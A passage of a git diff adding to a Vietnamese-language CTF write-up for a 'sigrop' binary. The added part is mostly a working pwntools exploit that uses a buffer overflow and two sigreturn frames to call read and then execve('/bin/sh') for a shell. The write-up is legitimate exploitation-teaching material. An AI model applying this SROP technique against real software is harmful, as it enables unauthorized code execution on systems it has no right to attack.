@@ -77,4 +77,67 @@ Các thanh ghi đã được thiết lập đúng như frame chúng ta nhập v�
 
 Chạy thử để tìm xem `/bin/sh` nằm ở đâu trong Stack.
 
+Thế vào frame.rdi:
 
+    frame.rdi=0x404428
+
+<img width="1086" height="546" alt="image" src="https://github.com/user-attachments/assets/71162c9e-76a9-441b-b1cb-0868f4350fcc" />
+
+# Script Python
+
+    #!/usr/bin/env python3
+    from pwn import *
+    context.binary=exe=ELF('./sigrop',checksec=False)
+    p=process(exe.path)
+    
+    def GDB():
+    	if not args.REMOTE:
+    		gdb.attach(p,gdbscript='''
+    			b*main+65
+    			c
+    			'''
+    		)
+    		input()
+    
+    GDB()
+    
+    rw_section=0x404320
+    pop_rax_syscall=0x0000000000401156
+    syscall=0x0000000000401157
+    
+    frame=SigreturnFrame()
+    frame.rax=0
+    frame.rdi=0
+    frame.rsi=rw_section
+    frame.rdx=0x400
+    frame.rsp=rw_section
+    frame.rip=syscall
+    
+    payload=b'A'*0x18
+    payload+=flat(
+    	pop_rax_syscall,
+    	0x0f,
+    	bytes(frame)
+    	)
+    
+    p.send(payload)
+    
+    frame=SigreturnFrame()
+    frame.rax=0x3b
+    frame.rdi=0x404428
+    frame.rsi=0
+    frame.rdx=0
+    frame.rsp=rw_section
+    frame.rip=syscall
+    
+    payload=flat(
+    	pop_rax_syscall,
+    	0x0f,
+    	bytes(frame),
+    	b'/bin/sh'
+    	)
+    
+    input()
+    p.send(payload)
+    
+    p.interactive()
